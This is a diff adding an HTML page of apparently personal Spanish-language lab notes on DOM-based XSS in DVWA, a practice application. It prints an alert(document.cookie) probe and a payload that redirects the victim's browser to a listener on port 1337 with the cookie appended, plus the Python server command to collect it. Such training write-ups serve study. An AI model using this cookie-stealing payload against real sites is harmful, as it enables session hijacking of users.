@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>XSS (DOM)</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>XSS (DOM)</h1><br/><p>El objetivo de esta pagina es que nostros podamos conseguir las cookies de una persona la cual le mandaremos el URL desde un seleccionar idioma.</p><p></p><p></p><p>Lo primeor que hacemos es intentar inspeccionar y ver como podemos modificar con <a href="DVWA--JavaScript_10.html">JavaScript</a> esta web, probamos con una alerta en algun idioma.</p><p></p><p><img src="images/7-1.png" alt="images/7-1.png" /></p><p></p><p>&lt;script&gt; alert(document.cookie)&lt;/script&gt; esto arroja la cookie en forma de alerta</p><p></p><p><img src="images/7-2.png" alt="images/7-2.png" /></p><p>notamos como este <a href="DVWA--JavaScript_10.html">JavaScript</a> cambia directamente en el URL </p><p></p><p><img src="images/7-3.png" alt="images/7-3.png" /></p><p></p><p>por lo que nos da una gran posibilidad de realizar fishing abriendo un servidor en python3 y esperar a que la persona aprete el servidor para que nosotros tengamos sus cookies, hagamoslo.</p><p></p><p>primero preparamos el <a href="DVWA--JavaScript_10.html">JavaScript</a> en el URL:</p><p></p><p><img src="images/7-4.png" alt="images/7-4.png" /></p><p></p><p>con este script estamos diciendole que redirija la ventana a nuestro server diciendo que las cookies son iguales y concatenamos con la variable document.cookie</p><p></p><p></p><p>luego para obtener las cookies  ejecutamos un servidor con python en el puerto 1337</p><p></p><p>python -m http.server 1337</p><p> </p><p>URL PARA FISHING:</p><p></p><p> <a href="http://192.168.0.101/DVWA/vulnerabilities/xss_d/?default=<script>window.location='http//:192.168.0.101:1337'cookie+'">http://192.168.0.101/DVWA/vulnerabilities/xss_d/?default=&lt;script&gt;window.location=&#39;http://192.168.0.101:1337/?cookie=&#39;</a> + document.cookie &lt;/script&gt;</p></div>
+</body>
+</html>
